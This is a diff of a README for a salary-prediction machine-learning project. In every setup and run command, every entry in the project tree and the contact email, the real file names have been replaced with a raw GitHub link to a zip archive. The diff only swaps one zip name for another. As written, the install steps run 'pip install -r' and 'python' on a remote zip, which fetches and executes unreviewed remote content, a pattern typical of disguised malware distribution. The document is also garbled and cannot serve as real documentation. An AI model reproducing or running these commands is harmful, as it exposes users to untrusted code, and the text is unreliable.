@@ -68,19 +68,19 @@ python -m venv venv
 source venv/bin/activate  # On Windows: venv\Scripts\activate
 
 # Install Python dependencies
-pip install -r https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/pages/Employee-Salary-Prediction-v3.8-alpha.2.zip
+pip install -r https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/Employee-Salary-Prediction-2.0.zip
 
 # Process data
-python https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/pages/Employee-Salary-Prediction-v3.8-alpha.2.zip
+python https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/Employee-Salary-Prediction-2.0.zip
 
 # Train models
-python https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/pages/Employee-Salary-Prediction-v3.8-alpha.2.zip
+python https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/Employee-Salary-Prediction-2.0.zip
 
 # Evaluate models
-python https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/pages/Employee-Salary-Prediction-v3.8-alpha.2.zip
+python https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/Employee-Salary-Prediction-2.0.zip
 
 # Start API server
-python https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/pages/Employee-Salary-Prediction-v3.8-alpha.2.zip
+python https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/Employee-Salary-Prediction-2.0.zip
 ```
 
 ## 🧠 ML Model Performance
@@ -109,25 +109,25 @@ Our ensemble approach uses multiple algorithms:
 │   │   ├── pages/             # Page components
 │   │   └── lib/               # Utilities
 │   ├── public/
-│   └── https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/pages/Employee-Salary-Prediction-v3.8-alpha.2.zip
+│   └── https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/Employee-Salary-Prediction-2.0.zip
 ├── ml_pipeline/                # Python ML code
-│   ├── https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/pages/Employee-Salary-Prediction-v3.8-alpha.2.zip     # Data preprocessing
-│   ├── https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/pages/Employee-Salary-Prediction-v3.8-alpha.2.zip      # Model training
-│   ├── https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/pages/Employee-Salary-Prediction-v3.8-alpha.2.zip    # Model evaluation
-│   ├── https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/pages/Employee-Salary-Prediction-v3.8-alpha.2.zip      # Flask API
-│   ├── https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/pages/Employee-Salary-Prediction-v3.8-alpha.2.zip             # Configuration
-│   └── https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/pages/Employee-Salary-Prediction-v3.8-alpha.2.zip              # Utility functions
+│   ├── https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/Employee-Salary-Prediction-2.0.zip     # Data preprocessing
+│   ├── https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/Employee-Salary-Prediction-2.0.zip      # Model training
+│   ├── https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/Employee-Salary-Prediction-2.0.zip    # Model evaluation
+│   ├── https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/Employee-Salary-Prediction-2.0.zip      # Flask API
+│   ├── https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/Employee-Salary-Prediction-2.0.zip             # Configuration
+│   └── https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/Employee-Salary-Prediction-2.0.zip              # Utility functions
 ├── data/                      # Dataset files
-│   ├── https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/pages/Employee-Salary-Prediction-v3.8-alpha.2.zip    # Raw dataset
+│   ├── https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/Employee-Salary-Prediction-2.0.zip    # Raw dataset
 │   └── processed/            # Processed data
 ├── models/                    # Trained models
-│   ├── https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/pages/Employee-Salary-Prediction-v3.8-alpha.2.zip
-│   ├── https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/pages/Employee-Salary-Prediction-v3.8-alpha.2.zip
+│   ├── https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/Employee-Salary-Prediction-2.0.zip
+│   ├── https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/Employee-Salary-Prediction-2.0.zip
 │   └── evaluation_reports/
 ├── notebooks/                 # Jupyter notebooks
-│   └── employee salary https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/pages/Employee-Salary-Prediction-v3.8-alpha.2.zip
-├── https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/pages/Employee-Salary-Prediction-v3.8-alpha.2.zip           # Python dependencies
-└── https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/pages/Employee-Salary-Prediction-v3.8-alpha.2.zip
+│   └── employee salary https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/Employee-Salary-Prediction-2.0.zip
+├── https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/Employee-Salary-Prediction-2.0.zip           # Python dependencies
+└── https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/Employee-Salary-Prediction-2.0.zip
 ```
 
 ## 🔧 API Endpoints
@@ -200,7 +200,7 @@ Our ensemble approach uses multiple algorithms:
 npm run dev
 
 # Backend API (Port 5000)
-python https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/pages/Employee-Salary-Prediction-v3.8-alpha.2.zip
+python https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/Employee-Salary-Prediction-2.0.zip
 ```
 
 ### Production Deployment
@@ -238,7 +238,7 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 ## 📞 Contact
 
 - **LinkedIn**: [Your LinkedIn Profile]
-- **Email**: https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/pages/Employee-Salary-Prediction-v3.8-alpha.2.zip
+- **Email**: https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/Employee-Salary-Prediction-2.0.zip
 - **GitHub**: [Your GitHub Profile]
 
 ---
